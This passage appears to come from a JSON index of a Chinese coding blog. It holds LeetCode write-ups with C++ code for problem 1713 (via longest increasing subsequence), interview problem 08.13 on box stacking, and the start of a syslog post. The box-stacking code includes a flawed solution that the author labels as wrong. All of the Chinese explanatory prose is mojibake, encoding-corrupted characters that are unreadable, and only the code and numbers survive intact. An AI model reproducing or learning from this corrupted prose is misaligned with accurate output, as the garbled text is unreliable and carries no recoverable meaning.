æ¥è¯´ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ arr æ•°ç»„ä¸­å°†å®ƒä»¬æ”¹å†™ä¸ºè¿™äº›å…ƒç´ åœ¨ target æ•°ç»„ä¸­çš„ä¸‹æ ‡ï¼Œå³ä½¿å¾— arr = [1,?,0,5,4,2,0,3] ã€‚\næˆ‘ä»¬è¦æ±‚è¿™ä¸¤ä¸ªæ•°ç»„çš„æœ€é•¿å…¬å…±å­åºåˆ—ï¼Œè¿™ä¸ªå­åºåˆ—åœ¨ target æ•°ç»„ä¸­æ˜¯ä»å‰å¾€åçš„ï¼Œç›¸å½“äºæ˜¯åœ¨è½¬æ¢åçš„ arr æ•°ç»„ä¸­æ±‚å¾—ä¸€ä¸ª æœ€é•¿é€’å¢ çš„åºåˆ—ã€‚\nå¯¹äºåƒ 7 è¿™æ ·åªå‡ºç°åœ¨ arr æ•°ç»„ä¸­ã€ä¸å‡ºç°åœ¨ target æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œå®ƒä¸å¯èƒ½å‡ºç°åœ¨æœ€é•¿å…¬å…±å­åºåˆ—ä¸­ï¼Œä¹Ÿå› æ­¤ä¸åº”è¯¥æ”¾å…¥æœ€é•¿é€’å¢åºåˆ—çš„è€ƒè™‘èŒƒå›´ï¼Œæˆ‘ä»¬éšä¾¿å°†å®ƒæ”¹ä¸ºæŸä¸ªç‰¹å®šçš„å€¼ï¼Œåœ¨è€ƒè™‘æœ€é•¿é€’å¢åºåˆ—çš„æ—¶å€™åˆ¤æ–­ä¸€ä¸‹å³å¯ã€‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•æ±‚æœ€é•¿é€’å¢å­åºåˆ—å‘¢ï¼Ÿ\n2.1 æœ€é•¿é€’å¢å­åºåˆ—ï¼šDP æœ€é•¿é€’å¢å­åºåˆ—çš„æ¨¡æ¿é¢˜å¯ä»¥çœ‹ 300. æœ€é•¿é€’å¢å­åºåˆ— - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com) ã€‚\né¦–å…ˆï¼Œæœ€å®¹æ˜“æƒ³åˆ°çš„åŠæ³•è‚¯å®šæ˜¯DPäº†ã€‚æˆ‘ä»¬ä½¿ç”¨æ•°ç»„ dp[i] è¡¨ç¤ºä»¥ç¬¬ i ä¸ªå…ƒç´ ä¸ºç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—é•¿åº¦ï¼›é‚£ä¹ˆï¼Œæ¯è€ƒè™‘ä¸€ä½ i ï¼Œæˆ‘ä»¬éƒ½è¦å‘å‰çœ‹ j = 0 ~ i-1 ï¼Œå¦‚æœ nums[i] \u0026gt; nums[j] ï¼Œè¯´æ˜ nums[i] å¯ä»¥ç›´æ¥åŠ åˆ°è¿™ä¸€åºåˆ—ä¸Šï¼Œå¾—åˆ°çš„é•¿åº¦æ˜¯ dp[j] + 1 ï¼Œæ‰€ä»¥ dp[i] = max(dp[j] + 1), j = 0~i-1ä¸”nums[i]\u0026gt;nums[j] ã€‚\nè¿™ä¸€æ€æƒ³è·Ÿ éš¾é¢˜æœ¬ | LeetCodeé¢è¯•é¢˜ 08.13. å †ç®±å­ (gitee.io) è¿™ç¯‡æ–‡ç« ä¸­ä½¿ç”¨çš„DPæ˜¯ä¸€æ ·çš„ã€‚\nä½¿ç”¨è¿™ä¸€æ€æƒ³åšå‡ºæ¥çš„æ¨¡æ¿æ˜¯è¿™æ ·çš„ï¼š\n// LeetCode 300. æœ€é•¿é€’å¢å­åºåˆ— class Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; dp(nums.size() + 2, 1); dp[1] = 1; for (int i = 2; i \u0026lt;= nums.size(); i++) { // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; // dp[i] = dp[i - 1]; for (int last = i - 1; last \u0026gt;= 1; last--) { if (nums[i - 1] \u0026gt; nums[last - 1]) { dp[i] = max(dp[i], dp[last] + 1); } } // cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; dp[i] \u0026lt;\u0026lt; endl; } int res = INT_MIN; for (int i = 1; i \u0026lt;= nums.size(); i++) res = max(res, dp[i]); return res; } }; Performance1 é—®é¢˜æ˜¯ï¼Œè¿™æ ·åšæ³•å¤æ‚åº¦è¿˜æ˜¯ O(n^2) ï¼Œæ— æ³•é€šè¿‡æˆ‘ä»¬æœ€åˆçš„é—®é¢˜ã€‚\n2.2 æœ€é•¿é€’å¢å­åºåˆ—ï¼šè´ªå¿ƒ+äºŒåˆ† è€ƒè™‘ä¸€ä¸ªç®€å•çš„è´ªå¿ƒï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ä¸Šå‡å­åºåˆ—å°½å¯èƒ½çš„é•¿ï¼Œåˆ™æˆ‘ä»¬éœ€è¦è®©åºåˆ—ä¸Šå‡å¾—å°½å¯èƒ½æ…¢ï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›æ¯æ¬¡åœ¨ä¸Šå‡å­åºåˆ—æœ€ååŠ ä¸Šçš„é‚£ä¸ªæ•°å°½å¯èƒ½çš„å°ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªæ•°ç»„ rec æ¥ç»´æŠ¤å½“å‰åºåˆ—ï¼Œå¦‚æœä¸€ä¸ªæ•° nums[i] \u0026gt; rec.back() ï¼Œè¯´æ˜è¿™ä¸ªæ•°å¯ä»¥ç›´æ¥æ”¾å…¥åºåˆ—ä¸­è€Œä¸å½±å“åºåˆ—çš„é€’å¢æ€§è´¨ï¼Œéå¸¸å¥½ï¼›è€Œå¦‚æœ nums[i] \u0026lt; rec.back() ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥å» rec ä¸­æ‰¾åˆ° ç¬¬ä¸€ä¸ªå¤§äº nums[i] çš„æ•° ï¼Œä½¿ç”¨ nums[i] æ›¿æ¢å®ƒã€‚\nä¸Šé¢çš„ç¬¬äºŒä¸ªæ¡ä»¶çœ‹èµ·æ¥éå¸¸ä»¤äººç–‘æƒ‘ï¼Œå®é™…ä¸Šæˆ‘ä»¬è€ƒè™‘è¿™ä¸€æƒ…å†µçš„æç«¯åœºæ™¯ï¼šæ•´ä¸ª rec æ•°ç»„ä¸­åªæœ‰æœ€åä¸€ä¸ªæ•°æ¯” nums[i] æ›´å¤§ã€‚\nä¾‹å¦‚ rec = [1,2,3,4,9] ï¼Œ nums[i] = 5 ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬ä¼šè‡ªç„¶åœ°æƒ³åˆ°å°† 9 æ›¿æ¢æˆ 5 ï¼Œå› ä¸ºè¿™æ ·åšèƒ½å¤Ÿç»´æŒåºåˆ—çš„é€’å¢æ€§ï¼Œè€Œä¸”å¯¹äºä¹‹åå‡ºç°çš„ nums[i] æ¥è¯´ï¼Œç»§ç»­åŠ å…¥è¿™ä¸€é€’å¢åºåˆ—çš„ å¯èƒ½æ€§ æ›´é«˜ã€‚\næ›´æ™®éåœ°è®²ï¼Œæˆ‘ä»¬å°† rec ä¸­ç¬¬ä¸€ä¸ªå¤§äº nums[i] çš„æ•°æ›¿æ¢æˆ nums[i] ï¼Œä¸ä¼šå½±å“æ•´ä¸ªåºåˆ—çš„é€’å¢æ€§ã€‚å‡è®¾è¢«æ›¿æ¢çš„æ•°ä¸º x ï¼Œæœ‰å¦‚ä¸‹çš„ä¸¤ç‚¹ï¼š\nrec æ•°ç»„ä¸­ï¼Œ x ä¹‹å‰çš„æ‰€æœ‰æ•°éƒ½å°äº nums[i] ï¼Œå› ä¸º x æ˜¯ç¬¬ä¸€ä¸ªå¤§äº nums[i] çš„æ•°ï¼› x ä¹‹åçš„æ‰€æœ‰æ•°æœ¬æ¥å°±å¤§äº x ï¼Œè€Œ x å¤§äº nums[i] ï¼Œå› æ­¤ x ä¹‹åçš„æ‰€æœ‰æ•°éƒ½å¤§äº nums[i] ï¼› å¯ä»¥çœ‹åˆ°ï¼Œå°† nums[i] åŠ å…¥ rec ä¹‹åï¼Œå¯¹åŸæœ‰çš„é€’å¢æ€§è´¨æ²¡æœ‰ä»»ä½•å½±å“ï¼›è€Œå¯¹äºä¹‹åå‡ºç°çš„ nums[i] æ¥è¯´ï¼Œç°åœ¨çš„ rec æ•°ç»„å·²ç»æ˜¯ å°½å¯èƒ½å° çš„æ•°ç»„äº†ï¼Œæ›´å®¹æ˜“åŠ å…¥åˆ°å®ƒä»¬ä¸­é—´ï¼Œç»´æŒé€’å¢ã€‚\nè¿™å°±æ˜¯è´ªå¿ƒçš„æ€æƒ³ã€‚è€Œå¯¹äºä» rec ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äº nums[i] è¿™ä¸€ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ rec çš„æœ‰åºæ€§ï¼Œä½¿ç”¨äºŒåˆ†çš„åŠæ³•è¿›è¡ŒæŸ¥æ‰¾ã€‚\nè¿™å°±æœ‰äº†å¦‚ä¸‹çš„ä»£ç ï¼š\nclass Solution { public: int lengthOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; rec; int len = 1; rec.push_back(nums[0]); for (auto n : nums) { if (n \u0026gt; rec[len - 1]) { rec.push_back(n); len++; } else if (n \u0026lt; rec[len - 1]) { int left = 0; int right = len - 1; int mid; while (left \u0026lt;= right) { mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return len; } }; æ³¨æ„äºŒåˆ†çš„è¾¹ç•Œï¼Œæœ€ç»ˆ left åº”è¯¥æŒ‡å‘ç¬¬ä¸€ä¸ªå¤§äº nums[i] çš„æ•°ï¼Œå› æ­¤ç›´æ¥ä¿®æ”¹ rec[left] å³å¯ã€‚\nPerformance2 3 æœ¬é¢˜ç»ˆè§£ å›åˆ°æœ€åˆçš„é—®é¢˜æ¥ã€‚\nç»è¿‡é—®é¢˜çš„è½¬åŒ–ï¼Œæˆ‘ä»¬çŸ¥é“åº”è¯¥å°† arr æ•°ç»„ä¸­å‡ºç°çš„ target å…ƒç´ è½¬åŒ–æˆå®ƒä»¬åœ¨ target æ•°ç»„ä¸­çš„ä¸‹æ ‡ï¼Œç„¶åå»æ±‚ arr æ•°ç»„ä¸­çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦ã€‚\nè¿™å°±æ¯”è¾ƒç®€å•äº†ã€‚æˆ‘ä»¬ä½¿ç”¨äºŒåˆ†+è´ªå¿ƒçš„åŠæ³•ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(nlogn) ï¼Œåº”è¯¥å¯ä»¥ACã€‚\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { map\u0026lt;int, int\u0026gt; mp; for (int idx = 0; idx \u0026lt; target.size(); idx++) { mp[target[idx]] = idx; // target[idx] å‡ºç°çš„ä½ç½® } for (int i = 0; i \u0026lt; arr.size(); i++) { if (mp.count(arr[i])) { arr[i] = mp[arr[i]]; } else { arr[i] = INT_MIN; } } vector\u0026lt;int\u0026gt; rec(1, INT_MIN); int len = 0; for (auto n : arr) { if (n \u0026gt; INT_MIN \u0026amp;\u0026amp; n \u0026gt; rec[len]) { rec.push_back(n); len++; } else if (n \u0026gt; INT_MIN) { int left = 1; int right = len; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (rec[mid] \u0026gt;= n) right = mid - 1; else left = mid + 1; } rec[left] = n; } } return target.size() - len; } }; Performance3 å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.å¾—åˆ°å­åºåˆ—çš„æœ€å°‘æ“ä½œæ¬¡æ•°[EB/OL].2021-07-25\nå¾—åˆ°å­åºåˆ—çš„æœ€å°‘æ“ä½œæ¬¡æ•° - å¾—åˆ°å­åºåˆ—çš„æœ€å°‘æ“ä½œæ¬¡æ•° - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\n[2] åŠ›æ‰£å®˜æ–¹é¢˜è§£.æœ€é•¿ä¸Šå‡å­åºåˆ—[EB/OL].2020-03-13\næœ€é•¿ä¸Šå‡å­åºåˆ— - æœ€é•¿é€’å¢å­åºåˆ— - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\n","date":"2021-08-02T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1713.-%E5%BE%97%E5%88%B0%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%9C%80%E5%B0%91%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/","title":"éš¾é¢˜æœ¬ | LeetCode1713. å¾—åˆ°å­åºåˆ—çš„æœ€å°‘æ“ä½œæ¬¡æ•°"},{"content":"è¿™é“é¢˜æœ‰ç‚¹éš¾ï¼Œä½†å¹¶ä¸æ˜¯å®Œå…¨éš¾ã€‚\né¢˜ç›® å †ç®±å­ã€‚ç»™ä½ ä¸€å †nä¸ªç®±å­ï¼Œç®±å­å®½ wiã€æ·± diã€é«˜ hiã€‚ç®±å­ä¸èƒ½ç¿»è½¬ï¼Œå°†ç®±å­å †èµ·æ¥æ—¶ï¼Œä¸‹é¢ç®±å­çš„å®½åº¦ã€é«˜åº¦å’Œæ·±åº¦å¿…é¡»å¤§äºä¸Šé¢çš„ç®±å­ã€‚å®ç°ä¸€ç§æ–¹æ³•ï¼Œæ­å‡ºæœ€é«˜çš„ä¸€å †ç®±å­ã€‚ç®±å †çš„é«˜åº¦ä¸ºæ¯ä¸ªç®±å­é«˜åº¦çš„æ€»å’Œã€‚\nè¾“å…¥ä½¿ç”¨æ•°ç»„ [wi, di, hi]è¡¨ç¤ºæ¯ä¸ªç®±å­ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š box = [[1, 1, 1], [2, 2, 2], [3, 3, 3]] è¾“å‡ºï¼š 6 ç¤ºä¾‹2\nè¾“å…¥ï¼š box = [[1, 1, 1], [2, 3, 4], [2, 6, 7], [3, 4, 5]] è¾“å‡ºï¼š 10 æ•°æ®èŒƒå›´\nç®±å­çš„æ•°ç›®ä¸å¤§äº3000ä¸ªã€‚ åˆ†æ ç®±å­æœ‰ä¸‰ä¸ªç»´åº¦ï¼Œä¸€ç¬é—´å°±è®©äººæƒ³åˆ°äº†ä¸‰ç»´çš„DPã€‚\nèƒ½å¦é™ä½å¾ªç¯å±‚æ•°å‘¢ï¼Ÿæˆ‘ä»¬æ³¨æ„åˆ°é¢˜ç›®ä¸­æ‰€è¯´çš„ ä¸‹é¢ç®±å­çš„å®½åº¦ã€é«˜åº¦å’Œæ·±åº¦å¿…é¡»å¤§äºä¸Šé¢çš„ç®±å­ ï¼Œé‚£ä¹ˆï¼Œåªéœ€è¦æ ¹æ®ä»»æ„ä¸€ä¸ªç»´åº¦è¿›è¡Œæ’åºï¼Œæœ€ç»ˆç®±å­å èµ·æ¥çš„é¡ºåºå°±æ˜¯æ’åºåçš„é¡ºåºï¼ˆæ­£åºæˆ–ååºï¼‰ã€‚\næ›´å…·ä½“åœ°è¯´ï¼Œå‡å¦‚æˆ‘ä»¬ä»¥å®½åº¦ w ä¸ºå‚ç…§è¿›è¡Œé™åºæ’åºï¼Œåˆ™å½“ i \u0026lt; j æ—¶ï¼Œç¬¬ i ä¸ªç®±å­ ä¸€å®š åœ¨ç¬¬ j ä¸ªç®±å­ä¸‹é¢ï¼ˆå¦‚æœå®ƒä»¬éƒ½è¢«é€‰ä¸­çš„è¯ï¼‰ï¼Œå› ä¸ºç¬¬ i ä¸ªç®±å­çš„å®½åº¦æ›´å¤§ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°‘è€ƒè™‘ä¸€ä¸ªç»´åº¦äº†ã€‚\nsort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); æ¥ç€ï¼Œæˆ‘ä»¬è€ƒè™‘æ·±åº¦å’Œé«˜åº¦ã€‚\né”™è§£ å¾ˆå®¹æ˜“é™·å…¥ä¼ ç»ŸDPçš„æ€è·¯ä¸­ï¼šä»¤ dp[w][h] è¡¨ç¤ºæ·±åº¦ d ã€é«˜ h æ—¶æ‰€èƒ½å–å¾—çš„æœ€å¤§é«˜åº¦ï¼Œåˆ™ä»¤æœ€å¤–å±‚ç®±å­ä¸‹æ ‡ä» 0 åˆ° box.size() - 1 å¾ªç¯ï¼Œæ¯ä¸€æ¬¡å¾ªç¯éƒ½ä»¤æ·±åº¦å’Œé«˜åº¦ä» 1 åˆ° maxDepth or maxHeight è¿›è¡Œå¾ªç¯ï¼Œé‚£ä¹ˆå½“å‰è¿™ä¸€ç®±å­ï¼Œé¢å¯¹æ·±åº¦ d å’Œé«˜åº¦ h çš„æ—¶å€™ï¼Œå–å¾— dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]) ã€‚\nç†è®ºä¸Šï¼Œè¿™ä¸€çŠ¶æ€è½¬æ¢å…¬å¼æ¥æºäºä¸€ä¸ªäº‹å®ï¼Œå³å½“å‰è¿™ä¸€ç®±å­æœ‰ä¸¤ç§é€‰æ‹©ï¼š\næ”¾ä¸Šå»ï¼šåˆ™ç•™ç»™ä¸Šä¸€ä¸ªç®±å­çš„ç©ºé—´åªå‰©ä¸‹ box[idx][1] çš„æ·±åº¦ï¼Œä»¥åŠ box[idx][2] çš„é«˜åº¦ï¼Œä¸Šä¸€ä¸ªç®±å­åˆ©ç”¨è¿™ä¸¤ä¸ªæ•°å€¼å–åˆ°çš„æœ€å¤§é«˜åº¦æ˜¯ dp[box[idx][1]][box[idx][2]] ï¼ŒåŠ ä¸Šå½“å‰ç®±å­æœ¬èº«çš„é«˜åº¦ box[idx][2] å³ä¸ºè¿™ä¸€æ–¹æ¡ˆæœ€ç»ˆå–å¾—çš„é«˜åº¦ï¼› ä¸æ”¾ä¸Šå»ï¼šåˆ™ç•™ç»™ä¸Šä¸€ä¸ªç®±å­çš„ç©ºé—´ä¸å˜ã€‚ åˆ©ç”¨è¿™ä¸€æ€è·¯å†™å‡ºå¦‚ä¸‹çš„ä»£ç ï¼š\nclass Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { int maxWidth = INT_MIN; int maxDepth = INT_MIN; int maxHeight = INT_MIN; for (auto b : box) { maxDepth = max(maxDepth, b[1]); maxHeight = max(maxHeight, b[2]); } sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026lt; b[0]; }); int dp[maxDepth + 2][maxHeight + 2]; memset(dp, 0, sizeof(dp)); for (int idx = 0; idx \u0026lt; box.size(); idx++) { for (int d = maxDepth + 1; d \u0026gt;= 1; d--) { for (int h = maxHeight + 1; h \u0026gt;= 1; h--) { if (box[idx][1] \u0026lt; d \u0026amp;\u0026amp; box[idx][2] \u0026lt; h) { dp[d][h] = max(dp[d][h], dp[box[idx][1]][box[idx][2]] + box[idx][2]); } } } } return dp[maxDepth + 1][maxHeight + 1]; }; è¿™ä¸ªä»£ç çš„é—®é¢˜åœ¨äºï¼šé¢˜ç›®ä¸­è¦æ±‚çš„æ˜¯ä¸‹æ–¹ç®±å­çš„å„é¡¹æ•°å€¼å¿…é¡» ä¸¥æ ¼å¤§äº ä¸Šæ–¹çš„ç®±å­ã€‚å°½ç®¡æˆ‘ä»¬è¿›è¡Œäº†æ’åºï¼Œç›¸é‚»ç®±å­çš„ å®½åº¦ ä»ç„¶å¯èƒ½æ˜¯ç›¸åŒçš„ï¼åœ¨çŠ¶æ€è½¬ç§»çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è€ƒè™‘äº†ä¸Šä¸€ä¸ªç®±å­çš„æ·±åº¦å’Œé«˜åº¦éƒ½ä¸¥æ ¼å°äºå½“å‰ç®±å­ï¼Œå´é—æ¼äº†å®ƒçš„å®½åº¦ã€‚\nè¿™å°±ä½¿å¾—æˆ‘ä»¬å–åˆ°çš„ dp[box[idx][1]][box[idx][2]] + box[idx][2] å¯èƒ½åŒæ—¶å°†å½“å‰ç®±å­å’Œä¸Šä¸€ä¸ªç®±å­éƒ½å †ä¸Šäº†ï¼Œè€Œå½“å‰ç®±å­ä¸ä¸Šä¸€ä¸ªç®±å­åœ¨å®½åº¦ä¸Šæ˜¯ç›¸åŒçš„ã€‚\nè¿™ä¸€æƒ…å†µä½“ç°åœ¨ç”¨ä¾‹ 2 ä¸­ï¼Œå¯¹å®½åº¦è¿›è¡Œæ’åºï¼Œè¿™ä¸€ä»£ç å°†è¾“å‡ºç­”æ¡ˆ 12 ï¼Œè¡¨ç¤ºå°† [1,1,1] ã€ [2,3,4] å’Œ [2,6,7] è¿™ä¸‰ä¸ªç®±å­éƒ½å †ä¸Šäº†ï¼›è€Œï¼Œå°½ç®¡ [2,3,4] å’Œ [2,6,7] åœ¨æ·±åº¦å’Œé«˜åº¦ä¸Šé€’å¢ï¼Œå´åœ¨å®½åº¦ä¸Šç›¸åŒï¼Œæˆ‘ä»¬çš„ä»£ç æ— æ³•è€ƒè™‘è¿™ä¸€æƒ…å½¢ã€‚\næ­£è§£ æœ‰ä¸€è¯´ä¸€ï¼Œé™·å…¥äº†é”™è§£çš„æ€è·¯ä¹‹åï¼Œå¾ˆéš¾è‡ªæ‹”ï¼Œæ­£è§£æ¥æºäºé¢˜è§£ã€‚\næˆ‘ä»¬éœ€è¦æ”¹å˜ dp æ•°ç»„çš„å«ä¹‰ï¼Œç°åœ¨ï¼Œä»¤å®ƒä½œä¸ºä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œ dp[i] è¡¨ç¤ºå°†ç¬¬ i ä¸ªç®±å­ç½®é¡¶æ—¶ï¼Œå–å¾—çš„æœ€å¤§é«˜åº¦ã€‚\næˆ‘ä»¬è¿˜æ˜¯å°†å®½åº¦ é™åºæ’åº ï¼Œå¦‚æœå¸Œæœ›å°†ç¬¬ i ä¸ªç®±å­ç½®é¡¶ï¼Œé‚£ä¹ˆå®ƒåº•ä¸‹çš„ç®±å­åªå¯èƒ½å‡ºç°åœ¨ 0 ~ i - 1 çš„ä¸‹æ ‡èŒƒå›´å†…ã€‚\næ¯æ¬¡è€ƒè™‘åˆ°ä¸€ä¸ª i æ—¶ï¼Œæˆ‘ä»¬å°±å‘å‰éå† 0 ~ i - 1 å·ç®±å­ï¼Œå¦‚æœæŸä¸ªç®±å­æ»¡è¶³ä¸‰ä¸ªç»´åº¦éƒ½å¤§äºå½“å‰çš„ i å·ç®±å­ï¼Œåˆ™å¯ä»¥å¾—åˆ°ä¸€ä¸ª dp[n] + box[i][2] çš„æ–¹æ¡ˆï¼Œå«ä¹‰æ˜¯å°†ç¬¬ n å·ç®±å­ç½®é¡¶æ—¶çš„æœ€å¤§é«˜åº¦ï¼ŒåŠ ä¸Šç°åœ¨çš„ç¬¬ i å·ç®±å­çš„é«˜åº¦ã€‚\nè¿™ä¸€æ–¹æ³•ç®€ç›´æ˜¯å¾ˆç›´è§‚äº†ï¼Œä½†æ˜¯éœ€è¦æ‰£å‡ ä¸ªç»†èŠ‚ï¼š\ndp[0] æ˜¾ç„¶æ˜¯ç¬¬ 0 å·ç®±å­ ç½®é¡¶ æ—¶çš„æœ€å¤§é«˜åº¦ï¼Œå½“å‰ç®±å­æœ‰æ²¡æœ‰å¯èƒ½ä¸æ”¾åœ¨ä»»ä½•ç®±å­ä¸Šå‘¢ï¼Ÿå½“ç„¶å¯èƒ½ã€‚å› æ­¤ï¼Œéå†å®Œ 0 ~ i - 1 å·ç®±å­ä¹‹åï¼Œè¿˜è¦å°†å–å¾—çš„æœ€å¤§æ–¹æ¡ˆä¸ box[i][2] è¿›è¡Œæ¯”è¾ƒï¼› æœ€ç»ˆè¿”å›çš„ç­”æ¡ˆå¯ä¸æ˜¯ dp[box.size() - 1] ï¼æœ‰æ‚–äºä¼ ç»Ÿçš„DPæ–¹æ¡ˆï¼Œè¿™é‡Œçš„ dp[box.size() - 1] è¡¨ç¤ºå°†æœ€åä¸€ä¸ªç®±å­ç½®é¡¶æ—¶çš„æœ€å¤§é«˜åº¦ï¼Œç„¶è€Œæœ€åä¸€ä¸ªç®±å­å¯ä¸ä¸€å®šè¦è¢«é€‰ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥éå†æ‰€æœ‰ç®±å­ï¼Œå–å¾—æœ€å¤§å€¼ã€‚ ACä»£ç  class Solution { public: int pileBox(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; box) { if (!box.size()) return 0; sort(box.begin(), box.end(), [](const vector\u0026lt;int\u0026gt;\u0026amp; a, const vector\u0026lt;int\u0026gt;\u0026amp; b) { return a[0] \u0026gt; b[0]; }); // dp[i] è¡¨ç¤ºå°†ç¬¬iä¸ªç®±å­æ”¾åœ¨é¡¶éƒ¨èƒ½å¤Ÿå–å¾—çš„æœ€å¤§çš„é«˜åº¦ // dp[i] = max(dp[n] + box[i][2]) vector\u0026lt;int\u0026gt; dp(box.size(), 0); dp[0] = box[0][2]; for (int i = 1; i \u0026lt; box.size(); i++) { // cout \u0026lt;\u0026lt; box[i][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[i][2] \u0026lt;\u0026lt; endl; for (int n = i - 1; n \u0026gt;= 0; n--) // éå†æ‰€æœ‰å¯èƒ½çš„åº•éƒ¨ { // cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; box[n][0] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][1] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; box[n][2] \u0026lt;\u0026lt; endl; if (box[n][0] \u0026gt; box[i][0] \u0026amp;\u0026amp; box[n][1] \u0026gt; box[i][1] \u0026amp;\u0026amp; box[n][2] \u0026gt; box[i][2]) { dp[i] = max(dp[i], dp[n] + box[i][2]); } } dp[i] = max(dp[i], box[i][2]); // è¡¨ç¤ºç¬¬ i å·ç®±å­ä¸æ”¾åœ¨ä»»ä½•ç®±å­é¡¶ä¸Š } int res = INT_MIN; // ç­”æ¡ˆä¸æ˜¯ dp[box.size() - 1] ï¼è¦å¾ªç¯å–å¾—æœ€å¤§å€¼ for (int i = 0; i \u0026lt; box.size(); i++) { res = max(dp[i], res); } return res; } }; å‚è€ƒèµ„æ–™ [1] ffreturn.08.13 c++å‡ ä¹åŒç™¾çš„æš´åŠ›åŠ¨æ€è§„åˆ’[EB/OL].2021-06-01\n08.13 c++å‡ ä¹åŒç™¾çš„æš´åŠ›åŠ¨æ€è§„åˆ’ - å †ç®±å­ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\n[2] knight.ã€çŒè±¹é¢˜è§£æ—¥è®°ã€‘åŠ¨æ€è§„åˆ’ã€å›æº¯ä¸¤ç§è§£æ³•[EB/OL].2020-07-08\nã€çŒè±¹é¢˜è§£æ—¥è®°ã€‘åŠ¨æ€è§„åˆ’ã€å›æº¯ä¸¤ç§è§£æ³• - å †ç®±å­ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\n","date":"2021-07-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode%E9%9D%A2%E8%AF%95%E9%A2%98-08.13.-%E5%A0%86%E7%AE%B1%E5%AD%90/","title":"éš¾é¢˜æœ¬ | LeetCodeé¢è¯•é¢˜ 08.13. å †ç®±å­"},{"content":"æ–­æ›´äº†å°†è¿‘ä¸¤ä¸ªæœˆï¼Ÿ\näº”æœˆä¸‹æ—¬å¼€å§‹å‚åŠ å®ä¹ ï¼Œå·¥ä½œé¢‡ä¸ºå¿™ç¢Œï¼Œå•ç¨‹ä¸€å°æ—¶çš„é€šå‹¤ä¹Ÿç£¨ç­äº†æˆ‘å›åˆ°å®¿èˆä¹‹åç»§ç»­å­¦ä¹ å’Œè¾“å‡ºçš„çƒ­æƒ…ï¼›ç„¶è€Œå®ä¹ å·²è¿‘ä¸¤æœˆï¼Œæ‰€å¹¸ç¨æœ‰æ‰€å¾—ï¼Œä¸åšè®°å½•åˆ™ææ„§å¯¹æ—¶å…‰çŸ£ã€‚\nsyslogå·¥ä½œæµç¨‹ç®€è¿° 